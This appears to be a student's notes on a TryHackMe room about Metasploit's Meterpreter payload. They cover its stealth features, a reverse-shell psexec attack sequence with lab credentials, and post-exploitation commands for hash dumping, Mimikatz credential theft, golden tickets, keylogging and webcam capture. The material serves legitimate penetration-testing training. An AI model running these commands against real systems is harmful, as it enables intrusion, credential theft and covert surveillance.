# 🧠 Metasploit: Meterpreter

---

## Task 1: Introduction to Meterpreter

**Meterpreter** is a Metasploit payload that provides an interactive shell running in memory on the target machine. It allows post-exploitation control with stealth and encrypted communication features.

### 🔐 How Meterpreter Works

- **Memory-Only Execution**: Runs in RAM, not written to disk to evade antivirus detection.
- **Encrypted Communication**: Uses TLS/HTTPS to bypass network IDS/IPS.
- **Process Injection**: Hides within legitimate system processes (e.g., `spoolsv.exe`).

### 🔍 Process Example
```bash
meterpreter > getpid
Current pid: 1304

meterpreter > ps
1304  spoolsv.exe  C:\Windows\System32\spoolsv.exe
```

Even DLL inspection via `tasklist /m` won't reveal Meterpreter, increasing stealth.

---

## Task 2: Meterpreter Flavors

### 💡 Payload Types

- **Inline (Single)**: Self-contained, entire payload delivered at once.
- **Staged**: Delivers a small stager that downloads the larger stage payload.

### 📦 Available Platforms

- Android
- iOS
- Java
- Linux
- macOS
- PHP
- Python
- Windows

### 🔍 Listing Meterpreter Payloads
```bash
msfvenom --list payloads | grep meterpreter
```

### 🛠 Choosing the Right Payload

Factors to consider:
- **OS Type**: Windows, Linux, Android, etc.
- **Interpreter Availability**: Is Python/PHP installed?
- **Network Environment**: Raw TCP, HTTPS, IPv6?

### 🧪 Example
```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads
```

Default payload often auto-selected:
```bash
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

---

## Task 3: Meterpreter Commands

### 🧭 Categories

- Core
- Filesystem
- Networking
- System
- UI (e.g., Webcam, Audio)
- Credential and Privilege tools

### 🧰 Core Commands

| Command | Description |
|---------|-------------|
| `background` | Puts session in background |
| `migrate <PID>` | Injects Meterpreter into another process |
| `load` | Loads extensions (e.g., `kiwi`) |
| `run` | Executes post modules or scripts |
| `help` | Shows full command list |

### 📁 File System Commands

```bash
ls, cd, pwd, cat, rm, search, upload, download
```

### 🌐 Networking Commands

```bash
ifconfig, netstat, route, portfwd, arp
```

### ⚙️ System Commands

```bash
getuid, getpid, ps, kill, clearev, shell, sysinfo, reboot, shutdown
```

### 🧾 Specialized Commands

```bash
screenshot, keyscan_start, keyscan_dump, getsystem, hashdump, webcam_snap
```

> Not all commands will work on every target (e.g., webcam on headless VMs).

---

## Task 4: Post-Exploitation with Meterpreter

### 👤 Checking Access Level
```bash
getuid
# NT AUTHORITY\SYSTEM
```

### 🧮 Viewing Processes
```bash
ps
```

### 🔁 Migrating to New Process
```bash
migrate <PID>
```

Note: Migrating from a SYSTEM process to a lower-privileged one can result in privilege loss.

### 🔐 Credential Dumping
```bash
hashdump
```

- Dumps Windows SAM file
- Stored as NTLM hashes (used for Pass-the-Hash attacks)

### 🗂 File Search
```bash
search -f flag2.txt
```

### 💻 Spawn Native Shell
```bash
shell
```

Return to Meterpreter:
```bash
CTRL+Z
```

---

## Task 5: Post-Exploitation Challenge

### 🧪 Objectives

- Gather OS and user data
- Escalate privileges
- Perform lateral movement
- Extract credentials

### 🧰 Load Python
```bash
load python
python_execute "print('TryHackMe Rocks!')"
```

### 🧠 Load Kiwi (Mimikatz)
```bash
load kiwi
```

#### 🔍 Kiwi Module Capabilities

| Command | Description |
|---------|-------------|
| `creds_all` | Dump all creds |
| `dcsync_ntlm` | Extract NTLM hash from DC |
| `lsa_dump_sam` | Dump SAM |
| `kerberos_ticket_list` | List Kerberos tickets |
| `wifi_list` | Show Wi-Fi creds |
| `password_change` | Change user password |
| `golden_ticket_create` | Create Kerberos Golden Ticket |

> Run `help` after loading a module to see new available commands.

---

## ⚡ Bonus: Simulated Initial Access

Use SMB exploit `exploit/windows/smb/psexec` with:

```bash
Username: ballen
Password: Password1
```

Example:
```bash
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser ballen
set SMBPass Password1
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

---

Mastering **Meterpreter** empowers you to carry out complex post-exploitation tasks with stealth and flexibility, making it one of the most critical components of a successful penetration test.
